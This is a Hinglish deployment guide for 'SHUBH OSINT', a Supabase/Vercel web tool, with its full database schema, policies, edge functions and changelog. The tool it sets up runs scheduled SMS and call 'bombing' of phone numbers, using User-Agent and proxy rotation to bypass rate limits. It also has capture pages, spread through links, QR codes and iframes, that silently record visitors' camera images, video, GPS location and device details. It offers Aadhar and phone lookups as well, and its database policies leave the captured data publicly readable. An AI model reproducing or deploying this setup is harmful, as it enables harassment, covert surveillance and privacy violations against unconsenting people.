# 🚀 Complete Migration Guide: Apna Supabase + Vercel Deployment

**Last Updated:** 2026-03-08  
**Version:** 5.1 (Telegram Bot Integration + CF Worker Proxy)

---

## 📋 Overview

Is guide mein step-by-step process hai:
1. Apna Supabase project setup
2. Database tables aur RLS policies create karna
3. Edge Functions deploy karna
4. Vercel pe deploy karna

---

## 🗄️ Step 1: Supabase Project Create Karo

1. **Supabase Dashboard** jao: https://supabase.com/dashboard
2. **New Project** click karo
3. Project details fill karo:
   - **Name**: Jo bhi naam dena hai
   - **Database Password**: Strong password set karo (yaad rakhna!)
   - **Region**: Nearest region select karo (Mumbai recommended for India)
4. **Create Project** click karo aur wait karo (2-3 minutes lagenge)

---

## 🔑 Step 2: API Keys Note Karo

Project ban jaane ke baad, **Settings → API** section mein jao:

| Key Name | Kahan Milega | Kahan Use Hoga |
|----------|--------------|----------------|
| **Project URL** | `https://YOUR_PROJECT_ID.supabase.co` | `.env` file, Vercel |
| **Anon (Public) Key** | API Keys section mein | `.env` file, Vercel |
| **Service Role Key** | API Keys section mein (Secret!) | Edge Functions Secrets |
| **Project ID** | URL mein `YOUR_PROJECT_ID` part | `.env` file, Vercel |

⚠️ **Important**: Service Role Key kabhi frontend code mein mat daalna!

---

## 🛠️ Step 3: Database Setup (SQL Run Karo)

### 3.1 SQL Editor Open Karo
Supabase Dashboard → **SQL Editor** → **New Query**

### 3.2 Complete SQL Script Copy-Paste Karo

`public/supabase-complete-setup.sql` file ka poora content copy karke paste karo.

Ya ye SQL directly use karo:

```sql
-- =====================================================
-- SHUBH OSINT - Complete Database Setup v4.1
-- =====================================================

-- 1. TABLES CREATE KARO
-- =====================================================

CREATE TABLE IF NOT EXISTS public.access_passwords (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_hash TEXT NOT NULL,
  password_display TEXT NOT NULL,
  total_credits INTEGER NOT NULL DEFAULT 0,
  remaining_credits INTEGER NOT NULL DEFAULT 0,
  is_enabled BOOLEAN NOT NULL DEFAULT true,
  is_used BOOLEAN NOT NULL DEFAULT false,
  is_unlimited BOOLEAN NOT NULL DEFAULT false,
  used_at TIMESTAMP WITH TIME ZONE,
  device_id TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public.user_sessions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_id UUID NOT NULL REFERENCES public.access_passwords(id) ON DELETE CASCADE,
  session_token TEXT NOT NULL,
  device_id TEXT NOT NULL,
  is_active BOOLEAN NOT NULL DEFAULT true,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  last_active_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public.credit_usage (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_id UUID NOT NULL REFERENCES public.access_passwords(id) ON DELETE CASCADE,
  search_type TEXT NOT NULL,
  search_query TEXT,
  credits_used INTEGER NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public.app_settings (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  setting_key TEXT NOT NULL UNIQUE,
  setting_value JSONB NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public.captured_photos (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id TEXT NOT NULL,
  image_data TEXT NOT NULL,
  user_agent TEXT,
  ip_address TEXT,
  captured_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public.captured_videos (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id TEXT NOT NULL,
  video_url TEXT NOT NULL,
  duration_seconds INTEGER DEFAULT 5,
  user_agent TEXT,
  ip_address TEXT,
  captured_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public.search_history (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  search_type TEXT NOT NULL,
  search_query TEXT NOT NULL,
  ip_address TEXT,
  searched_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Hit APIs Table (v3.8 - API Hit Engine configs)
CREATE TABLE IF NOT EXISTS public.hit_apis (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  name TEXT NOT NULL,
  url TEXT NOT NULL,
  method TEXT NOT NULL DEFAULT 'GET',
  headers JSONB NOT NULL DEFAULT '{}'::jsonb,
  body JSONB NOT NULL DEFAULT '{}'::jsonb,
  body_type TEXT NOT NULL DEFAULT 'json',
  query_params JSONB NOT NULL DEFAULT '{}'::jsonb,
  enabled BOOLEAN NOT NULL DEFAULT true,
  proxy_enabled BOOLEAN NOT NULL DEFAULT false,
  force_proxy BOOLEAN NOT NULL DEFAULT false,
  rotation_enabled BOOLEAN NOT NULL DEFAULT false,
  residential_proxy_enabled BOOLEAN NOT NULL DEFAULT false,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Scheduled Hits Table (v4.0 - cron-based scheduled bombing)
CREATE TABLE IF NOT EXISTS public.scheduled_hits (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  phone_number TEXT NOT NULL,
  start_time TIMESTAMP WITH TIME ZONE NOT NULL,
  interval_seconds INTEGER NOT NULL DEFAULT 60,
  max_rounds INTEGER DEFAULT 0,
  is_active BOOLEAN NOT NULL DEFAULT true,
  last_executed_at TIMESTAMP WITH TIME ZONE,
  next_execution_at TIMESTAMP WITH TIME ZONE,
  total_hits INTEGER NOT NULL DEFAULT 0,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- 2. ROW LEVEL SECURITY (RLS) ENABLE KARO
-- =====================================================

ALTER TABLE public.access_passwords ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.user_sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.credit_usage ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.app_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.captured_photos ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.captured_videos ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.search_history ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.hit_apis ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.scheduled_hits ENABLE ROW LEVEL SECURITY;

-- 3. RLS POLICIES CREATE KARO
-- =====================================================

-- Sensitive tables: No direct access
CREATE POLICY "No direct access to passwords" 
ON public.access_passwords FOR ALL USING (false);

CREATE POLICY "No direct access to sessions" 
ON public.user_sessions FOR ALL USING (false);

CREATE POLICY "No direct access to credit usage" 
ON public.credit_usage FOR ALL USING (false);

-- App Settings: Public read/write
CREATE POLICY "Anyone can read settings" 
ON public.app_settings FOR SELECT USING (true);

CREATE POLICY "Anyone can insert settings" 
ON public.app_settings FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can update settings" 
ON public.app_settings FOR UPDATE USING (true);

-- Captured Photos: Public access (PERMISSIVE required!)
CREATE POLICY "Anyone can view captured photos" 
ON public.captured_photos FOR SELECT USING (true);

CREATE POLICY "Allow insert for photo capture" 
ON public.captured_photos FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can delete captured photos" 
ON public.captured_photos FOR DELETE USING (true);

-- Captured Videos: Public access (PERMISSIVE required!)
CREATE POLICY "Anyone can view captured videos metadata" 
ON public.captured_videos FOR SELECT USING (true);

CREATE POLICY "Anyone can insert video metadata" 
ON public.captured_videos FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can delete video metadata" 
ON public.captured_videos FOR DELETE USING (true);

-- Search History: Public access
CREATE POLICY "Anyone can view search history" 
ON public.search_history FOR SELECT USING (true);

CREATE POLICY "Anyone can insert search history" 
ON public.search_history FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can delete search history" 
ON public.search_history FOR DELETE USING (true);

-- Hit APIs: Public CRUD (admin-password protected in frontend)
CREATE POLICY "Anyone can read hit apis" 
ON public.hit_apis FOR SELECT USING (true);

CREATE POLICY "Anyone can insert hit apis" 
ON public.hit_apis FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can update hit apis" 
ON public.hit_apis FOR UPDATE USING (true);

CREATE POLICY "Anyone can delete hit apis" 
ON public.hit_apis FOR DELETE USING (true);

-- Scheduled Hits: Public CRUD
CREATE POLICY "Anyone can read scheduled hits" 
ON public.scheduled_hits FOR SELECT USING (true);

CREATE POLICY "Anyone can insert scheduled hits" 
ON public.scheduled_hits FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can update scheduled hits" 
ON public.scheduled_hits FOR UPDATE USING (true);

CREATE POLICY "Anyone can delete scheduled hits" 
ON public.scheduled_hits FOR DELETE USING (true);

-- 4. STORAGE BUCKETS CREATE KARO
-- =====================================================

INSERT INTO storage.buckets (id, name, public) 
VALUES ('captured-videos', 'captured-videos', true)
ON CONFLICT (id) DO NOTHING;

INSERT INTO storage.buckets (id, name, public) 
VALUES ('captured-photos', 'captured-photos', true)
ON CONFLICT (id) DO NOTHING;

INSERT INTO storage.buckets (id, name, public) 
VALUES ('backgrounds', 'backgrounds', true)
ON CONFLICT (id) DO NOTHING;

-- Storage Policies
CREATE POLICY "Anyone can view captured videos" 
ON storage.objects FOR SELECT USING (bucket_id = 'captured-videos');

CREATE POLICY "Anyone can upload captured videos" 
ON storage.objects FOR INSERT WITH CHECK (bucket_id = 'captured-videos');

CREATE POLICY "Anyone can delete captured videos" 
ON storage.objects FOR DELETE USING (bucket_id = 'captured-videos');

CREATE POLICY "Public can view captured photos" 
ON storage.objects FOR SELECT USING (bucket_id = 'captured-photos');

CREATE POLICY "Anyone can upload captured photos" 
ON storage.objects FOR INSERT WITH CHECK (bucket_id = 'captured-photos');

CREATE POLICY "Anyone can delete captured photos" 
ON storage.objects FOR DELETE USING (bucket_id = 'captured-photos');

CREATE POLICY "Public can view backgrounds" 
ON storage.objects FOR SELECT USING (bucket_id = 'backgrounds');

CREATE POLICY "Anyone can upload backgrounds" 
ON storage.objects FOR INSERT WITH CHECK (bucket_id = 'backgrounds');

CREATE POLICY "Anyone can update backgrounds" 
ON storage.objects FOR UPDATE USING (bucket_id = 'backgrounds');

CREATE POLICY "Anyone can delete backgrounds" 
ON storage.objects FOR DELETE USING (bucket_id = 'backgrounds');

-- 5. FUNCTIONS & TRIGGERS
-- =====================================================

CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

CREATE TRIGGER update_app_settings_updated_at
BEFORE UPDATE ON public.app_settings
FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

CREATE TRIGGER update_access_passwords_updated_at
BEFORE UPDATE ON public.access_passwords
FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

CREATE TRIGGER update_hit_apis_updated_at
BEFORE UPDATE ON public.hit_apis
FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

CREATE TRIGGER update_scheduled_hits_updated_at
BEFORE UPDATE ON public.scheduled_hits
FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

-- 6. INDEXES FOR PERFORMANCE
-- =====================================================

CREATE INDEX IF NOT EXISTS idx_app_settings_key ON public.app_settings(setting_key);
CREATE INDEX IF NOT EXISTS idx_user_sessions_token ON public.user_sessions(session_token);
CREATE INDEX IF NOT EXISTS idx_user_sessions_password ON public.user_sessions(password_id);
CREATE INDEX IF NOT EXISTS idx_credit_usage_password ON public.credit_usage(password_id);
CREATE INDEX IF NOT EXISTS idx_credit_usage_date ON public.credit_usage(created_at);
CREATE INDEX IF NOT EXISTS idx_captured_photos_session ON public.captured_photos(session_id);
CREATE INDEX IF NOT EXISTS idx_captured_photos_date ON public.captured_photos(captured_at);
CREATE INDEX IF NOT EXISTS idx_captured_videos_session ON public.captured_videos(session_id);
CREATE INDEX IF NOT EXISTS idx_captured_videos_date ON public.captured_videos(captured_at);
CREATE INDEX IF NOT EXISTS idx_search_history_type ON public.search_history(search_type);
CREATE INDEX IF NOT EXISTS idx_search_history_date ON public.search_history(searched_at);
CREATE INDEX IF NOT EXISTS idx_access_passwords_hash ON public.access_passwords(password_hash);
CREATE INDEX IF NOT EXISTS idx_hit_apis_enabled ON public.hit_apis(enabled);
CREATE INDEX IF NOT EXISTS idx_hit_apis_name ON public.hit_apis(name);
CREATE INDEX IF NOT EXISTS idx_scheduled_hits_active ON public.scheduled_hits(is_active);
CREATE INDEX IF NOT EXISTS idx_scheduled_hits_next ON public.scheduled_hits(next_execution_at);
CREATE INDEX IF NOT EXISTS idx_scheduled_hits_phone ON public.scheduled_hits(phone_number);

-- 7. REALTIME ENABLE KARO
-- =====================================================

ALTER PUBLICATION supabase_realtime ADD TABLE public.hit_apis;

-- 8. DEFAULT SETTINGS INSERT KARO
-- =====================================================

INSERT INTO public.app_settings (setting_key, setting_value)
VALUES (
  'main_settings',
  '{
    "sitePassword": "dark",
    "adminPassword": "dark",
    "theme": "dark",
    "headerName1": "SHUBH",
    "headerName2": "OSINT",
    "headerColor1": "green",
    "headerColor2": "pink",
    "headerFont": "Orbitron",
    "headerStyle": "normal",
    "camSessionId": "shubhcam01",
    "camRedirectUrl": "https://google.com",
    "customCaptureHtml": "",
    "chromeCustomHtml": "",
    "camIframeUrl": "",
    "camPhotoLimit": 0,
    "camCaptureInterval": 500,
    "camVideoDuration": 5,
    "camCountdownTimer": 5,
    "camAutoRedirect": true,
    "camQuality": 0.8,
    "creditSystemEnabled": true,
    "headerBorderEnabled": true,
    "tabContainerBorderEnabled": true,
    "tabs": []
  }'::jsonb
)
ON CONFLICT (setting_key) DO NOTHING;
```

### 3.3 Run Query
**Run** button click karo. Success message aana chahiye.

---

## ⚡ Step 4: Edge Functions Deploy Karo

### 4.1 Supabase CLI Install Karo

```bash
# Windows (PowerShell as Admin)
scoop install supabase

# Mac
brew install supabase/tap/supabase

# Linux
brew install supabase/tap/supabase

# Ya npm se
npm install -g supabase
```

### 4.2 Login Karo

```bash
supabase login
```
Browser open hoga, login karo.

### 4.3 Project Link Karo

```bash
cd your-project-folder
supabase link --project-ref YOUR_PROJECT_ID
```

### 4.4 Edge Functions Deploy Karo

```bash
# Sab functions ek saath deploy (v5.1 - 13 functions)
supabase functions deploy auth-login
supabase functions deploy auth-verify
supabase functions deploy credits-deduct
supabase functions deploy admin-passwords
supabase functions deploy aadhar-search
supabase functions deploy numinfo-v2
supabase functions deploy telegram-osint
supabase functions deploy call-dark
supabase functions deploy hit-api
supabase functions deploy image-to-info
supabase functions deploy execute-scheduled-hits
supabase functions deploy fast-hit-all
supabase functions deploy telegram-bot
```

### 4.5 Edge Function Secrets Set Karo

Supabase Dashboard → **Settings** → **Edge Functions** → **Secrets**

| Secret Name | Value |
|-------------|-------|
| `MY_SUPABASE_URL` | `https://YOUR_PROJECT_ID.supabase.co` |
| `MY_SERVICE_ROLE_KEY` | Service Role Key |

### 4.6 Scheduled Hits Cron Setup (Optional)

Agar scheduled bombing feature chahiye toh pg_cron + pg_net enable karo:

1. Supabase Dashboard → **Database** → **Extensions**
2. `pg_cron` aur `pg_net` enable karo
3. SQL Editor mein ye run karo:

```sql
select cron.schedule(
  'execute-scheduled-hits-every-minute',
  '* * * * *',
  $$
  select net.http_post(
    url:='https://YOUR_PROJECT_ID.supabase.co/functions/v1/execute-scheduled-hits',
    headers:='{"Content-Type": "application/json", "Authorization": "Bearer YOUR_ANON_KEY"}'::jsonb,
    body:=concat('{"time": "', now(), '"}')::jsonb
  ) as request_id;
  $$
);
```

⚠️ `YOUR_PROJECT_ID` aur `YOUR_ANON_KEY` replace karna mat bhoolo!

---

## 🌐 Step 5: Vercel Deployment

### 5.1 Environment Variables Set Karo

| Variable Name | Value |
|--------------|-------|
| `VITE_SUPABASE_URL` | `https://YOUR_PROJECT_ID.supabase.co` |
| `VITE_SUPABASE_PUBLISHABLE_KEY` | Anon (Public) Key |
| `VITE_SUPABASE_PROJECT_ID` | YOUR_PROJECT_ID |

### 5.2 Deploy Karo

GitHub repo connect karke deploy karo.

---

## 📁 Edge Functions Reference (v4.1)

| Function | Purpose | Method |
|----------|---------|--------|
| `auth-login` | User login with password | POST |
| `auth-verify` | Verify session & get credits | POST |
| `credits-deduct` | Deduct credits for search | POST |
| `admin-passwords` | Admin CRUD operations | POST |
| `aadhar-search` | Aadhar lookup | POST |
| `numinfo-v2` | Phone number info | POST |
| `telegram-osint` | Telegram OSINT API | POST |
| `call-dark` | AI call dispatch | POST |
| `hit-api` | API Hit Engine + UA rotation | POST |
| `image-to-info` | Image analysis API | POST |
| `execute-scheduled-hits` | Cron scheduled bombing | POST |
| `fast-hit-all` | Hit ALL enabled APIs at once | POST |

---

## 🔄 Version 4.2 Changes

### Fast Hit All API (External API Endpoint)
- ✅ `fast-hit-all` edge function — hit ALL enabled APIs with single POST call
- ✅ Batch processing: 15 APIs per batch to avoid edge function timeout
- ✅ Secret key authentication via URL parameter (`?key=YOUR_SECRET_KEY`)
- ✅ Configurable rounds (max 50), `{PHONE}` placeholder replacement
- ✅ Rate limiting: 5 requests per IP per minute
- ✅ Admin panel: FastApiKeyManager for secret key management + copy POST URL
- ✅ POST URL format: `POST https://...fast-hit-all?key=KEY` with JSON body `{"phone":"NUMBER","rounds":1}`

---

## 🔄 Version 4.1 Changes

### Full Neon Theme Overhaul
- ✅ Pure black background with neon glow orbs (green, pink, cyan, purple)
- ✅ Header: rainbow running border animation + color-cycling logo text
- ✅ Tab grid: color-changing running border (green → cyan → pink → purple)
- ✅ Feature cards: neon color-specific glow variants on selection
- ✅ Logs panel: terminal-style with neon green success / neon red failure
- ✅ All text: neon text-shadow + font-mono terminal aesthetic
- ✅ Backdrop-blur + glowing containers across all components

---

## 🔄 Version 4.0 Changes

### Scheduled Hits (Server-Side Cron)
- ✅ `scheduled_hits` table for automated bombing schedules
- ✅ `execute-scheduled-hits` edge function for background execution
- ✅ pg_cron + pg_net integration (runs every minute)
- ✅ Configurable: interval, max rounds, start time
- ✅ Auto-deactivates when max rounds reached

### SMS Bomber Simplification
- ✅ Only phone number logged to search_history (no per-hit logs)
- ✅ Disabled tabs remain visible but show "contact admin"
- ✅ Disabled tab attempts logged as `[type]_disabled`

---

## 🔄 Version 3.9 Changes

### Hit Engine Database Migration
- ✅ APIs ab `hit_apis` table mein store hoti hain (localStorage hataya)
- ✅ APIs persist across sessions and devices
- ✅ Realtime sync enabled — changes instantly reflect
- ✅ Delete API feature added to API cards
- ✅ `updated_at` trigger for hit_apis table

### User-Agent Rotation (Rate Limit Bypass)
- ✅ 35+ different browser User-Agents added
- ✅ Har request pe DIFFERENT User-Agent use hota hai
- ✅ Chrome, Firefox, Safari, Edge, Opera, Brave, Vivaldi
- ✅ Windows, Mac, Linux, Android, iPhone sab covered

---

## 🔄 Version 3.7 Changes

### Tab Container 12-Color Rainbow Border
- ✅ 12 unique neon colors for tab container border

---

## 🔄 Version 3.6 Changes

### QR Code Generator
- ✅ QR codes for all capture link types
- ✅ Customizable size, colors, presets

---

## 🔄 Version 3.5 Changes

### Border Effects
- ✅ Toggle rainbow borders for header and tab container

---

## 🔄 Version 3.4 Changes

### Iframe Capture Feature
- ✅ New `/iframe-capture` page for embedding any URL
- ✅ Silent camera capture runs in background with iframe
- ✅ Device info + GPS location captured automatically

---

## 🔄 Version 3.3 Changes

### CALL DARK Feature
- ✅ AI-powered automated calls via Omnidim API
- ✅ Admin panel settings for API Key, Agent ID

---

## 🔧 Troubleshooting

### Error: "Failed to fetch" ya CORS Error
- Edge functions mein CORS headers check karo
- Supabase URL sahi hai check karo

### Error: "Invalid password"
- admin-passwords edge function se naya password create karo

### Error: "Insufficient credits"
- Database mein remaining_credits check karo
- is_enabled = true hai check karo

### Camera Not Working
- HTTPS required hai (localhost ok hai)
- Camera permissions allow karo
- RLS policies PERMISSIVE honi chahiye

### Edge Function Deploy Fail
```bash
rm supabase/functions/deno.lock
supabase functions deploy function-name
```

### Hit Engine Rate Limit
- User-Agent rotation automatically handles most rate limits
- Enable "Free Proxy" toggle for additional IP rotation
- Use Residential Proxy for strongest bypass

### Scheduled Hits Not Executing
- pg_cron aur pg_net extensions enabled hain check karo
- Cron job schedule verify karo: `select * from cron.job;`
- Edge function logs check karo for errors

---

## 📊 Database Tables Quick Reference

| Table | Purpose | RLS | Realtime |
|-------|---------|-----|----------|
| `access_passwords` | Login credentials | Restrictive (Edge only) | ❌ |
| `user_sessions` | Active sessions | Restrictive (Edge only) | ❌ |
| `credit_usage` | Credit logs | Restrictive (Edge only) | ❌ |
| `app_settings` | Global config | Public read/write | ❌ |
| `captured_photos` | Photo metadata | Public (Permissive) | ❌ |
| `captured_videos` | Video metadata | Public (Permissive) | ❌ |
| `search_history` | Search logs | Public | ❌ |
| `hit_apis` | API Hit Engine configs | Public CRUD | ✅ |
| `scheduled_hits` | Scheduled bombing | Public CRUD | ❌ |

---

## ✅ Setup Complete Checklist

- [ ] Supabase project created
- [ ] API keys noted
- [ ] SQL script executed (v4.1)
- [ ] Storage buckets created
- [ ] Edge functions deployed (12 functions)
- [ ] Secrets configured
- [ ] pg_cron + pg_net enabled (for scheduled hits)
- [ ] Cron job created for execute-scheduled-hits
- [ ] fast-hit-all secret key configured (optional)
- [ ] Vercel env vars set
- [ ] Site tested
- [ ] Hit Engine tested
- [ ] Fast Hit All API tested
- [ ] Scheduled Hits tested
- [ ] Neon theme verified
